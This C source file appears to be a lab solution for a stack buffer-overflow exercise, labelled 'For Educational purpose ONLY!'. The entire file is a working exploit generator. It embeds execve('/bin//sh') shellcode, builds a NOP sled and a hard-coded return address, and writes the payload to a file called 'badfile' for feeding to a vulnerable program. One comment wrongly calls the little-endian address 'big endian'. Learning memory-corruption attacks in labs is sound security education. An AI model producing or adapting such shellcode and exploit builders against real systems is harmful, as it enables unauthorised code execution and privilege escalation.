/*      AUTHOR:       Srizan Gangol   
		A program that creates a file containing code for launching shell
		For Educational purpose ONLY!
*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
"\x31\xc0"        /*xorl %eax,%eax*/
"\x50"            /*pushl %eax*/
"\x68""//sh"      /*pushl $0x68732f2f*/
"\x68""/bin"      /*pushl $0x6e69622f*/
"\x89\xe3"        /*movl %esp,%ebx*/
"\x50"            /*pushl %eax*/
"\x53"            /*pushl %ebx*/
"\x89\xe1"        /*movl %esp,%ecx*/
"\x99"            /*cdq*/
"\xb0\x0b"        /*movb $0x0b,%al*/
"\xcd\x80"        /*int $0x80*/
;

void main(int argc, char **argv)
{
char buffer[517];
FILE *badfile;
/*Assign the return address in big endian style*/
char * ret ="\x74\xf1\xff\xbf"; //here goes your safe_offset address
int i=0;
/*Initialize buffer with 0x90 (NOP instruction)*/
memset(&buffer, 0x90, 517);
/*Fill the buffer with shell code starting from a value after safe offset*/
memcpy(buffer+60, shellcode,sizeof(shellcode));//copy shellcode into buffer
/*Overwrite return address*/
for(i=0;i<32;i+=4)
memcpy(buffer+i,ret,sizeof(ret));
/*Save the contents to the file "badfile"*/
badfile = fopen("./badfile", "w");
fwrite(buffer, 517, 1, badfile);
fclose(badfile);
}
